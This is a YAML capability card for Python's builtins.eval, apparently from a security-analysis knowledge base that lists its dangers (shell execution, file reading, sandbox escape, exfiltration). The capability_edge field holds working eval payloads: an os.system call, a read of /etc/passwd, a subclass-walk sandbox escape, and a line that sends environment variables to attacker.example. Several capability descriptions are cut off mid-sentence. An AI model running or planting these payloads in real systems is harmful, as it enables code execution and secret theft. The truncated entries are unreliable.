# builtins.eval

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-a79b147832bd1d62
api: builtins.eval
api_family: builtins.eval
runtime:
  language: python
  ecosystem: python-runtime
  package: builtins
  version: legacy-source-bound
capability_class: code-eval
normative_authority: capability-facts-only
bound_sinks:
- builtins.exec
- builtins.compile
- builtins.__import__
- os.system
- os.popen
roles:
- role_id: code
  description: Legacy controlled role code.
  bindings:
  - expression: code
    caller_bindable: true
facets:
- facet_id: legacy-facet-0f51e40d
  capability: Evaluate an arbitrary Python expression string (single expression only; no
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-9e668a65
  capability: Accept a pre-compiled code object (output of compile()) as the source,
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-305eb5f1
  capability: By default, inherit the full caller globals() and locals() dictionaries,
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-0bd5939c
  capability: Through `__import__`, import ANY stdlib or installed module whose name is
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-7d151435
  capability: Execute arbitrary shell commands via `__import__('os').system(cmd)` or
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-fe1ec5d9
  capability: Read arbitrary files from the filesystem using `open(path).read()` or
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-45a73526
  capability: 'Enumerate the filesystem: `__import__(''os'').listdir(path)`,'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-9d78e379
  capability: 'Access environment variables: `__import__(''os'').environ[key]`.'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-be9fbde4
  capability: Instantiate networking capabilities — make arbitrary HTTP requests via
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-2cb75c9d
  capability: Escape a "safely" restricted globals dictionary through CPython
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-79d9c0b3
  capability: Access `ctypes` to directly manipulate memory (read/write arbitrary
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-1ce713ff
  capability: Invoke Python's C API via `ctypes.pythonapi` to modify interpreter state
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-6f70838a
  capability: 'Leak sensitive runtime state: `sys.path`, `sys.modules`, `sys.argv`,'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-461b90ef
  capability: 'Perform denial-of-service: `exit()`, `__import__(''os'')._exit(0)`,'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-f0272a53
  capability: Exfiltrate data over DNS via `__import__('socket').getaddrinfo(...)` or
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-5022ed9c
  capability: Dynamically construct and call arbitrary Python code at runtime through
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-04626bde
  capability: 'Serialize/deserialize payloads: `__import__(''pickle'').loads(...)`,'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-bba81026
  role_id: null
  value: When `globals` and `locals` are omitted, eval() inherits the caller's
  security_effect: When `globals` and `locals` are omitted, eval() inherits the caller's
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-7b5f9559
  role_id: null
  value: The `__builtins__` key is always present in default globals() unless the
  security_effect: The `__builtins__` key is always present in default globals() unless the
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-027a317e
  role_id: null
  value: The `__import__` builtin is available by default in `__builtins__`; there
  security_effect: The `__import__` builtin is available by default in `__builtins__`; there
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-a3c3b920
  role_id: null
  value: When only `globals` is passed and `locals` is omitted, `locals` defaults
  security_effect: When only `globals` is passed and `locals` is omitted, `locals` defaults
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-387c7116
  role_id: null
  value: CPython's MRO-based introspection (e.g. `().__class__.__bases__`) is an
  security_effect: CPython's MRO-based introspection (e.g. `().__class__.__bases__`) is an
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-88f05bcb
  role_id: null
  value: eval() with a code object produced by `compile(..., 'exec')` can execute
  security_effect: eval() with a code object produced by `compile(..., 'exec')` can execute
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: '# Calculate a user-provided math expression

    expr = "2 + 3 * 7"

    result = eval(expr)  # 23


    # Evaluate a boolean filter

    rule = "x > 5 and y < 10"

    result = eval(rule, {"x": 7, "y": 3, "__builtins__": {}})  # True

    '
  capability_edge: "# 1) Shell command execution\neval('__import__(\"os\").system(\"id\")')\n\n# 2) Read /etc/passwd\neval('__import__(\"os\").popen(\"cat /etc/passwd\").read()')\n\n# 3) Sandbox escape via CPython introspection (restore full __builtins__)\neval('[c for c in ().__class__.__bases__[0].__subclasses__() '\n     'if c.__name__ == \"catch_warnings\"][0]()._module.__builtins__[\"__import__\"](\"os\").system(\"id\")')\n\n# 4) Outbound HTTP data exfiltration\neval('__import__(\"urllib.request\").urlopen(\"http://attacker.example/?\" + '\n     '__import__(\"os\").popen(\"env\").read())')\n"
provenance:
- https://docs.python.org/3/library/functions.html#eval
- '{''CWE-95'': ''Improper Neutralization of Directives in Dynamically Evaluated Code (Eval Injection)''}'
- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html
```
